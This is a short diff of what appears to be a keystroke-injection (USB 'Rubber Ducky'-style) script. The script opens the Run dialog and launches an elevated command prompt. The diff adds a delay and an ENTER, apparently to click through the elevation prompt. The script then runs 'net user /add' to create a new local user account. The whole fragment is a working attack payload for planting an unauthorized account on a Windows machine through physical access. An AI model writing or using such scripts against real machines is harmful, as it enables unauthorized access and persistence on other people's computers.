@@ -3,6 +3,8 @@ GUI r
 DELAY 500
 cmd
 CTRL SHIFT ENTER
+DELAY 500
+ENTER
 DELAY 1000
 net user /add username password
 DELAY 500
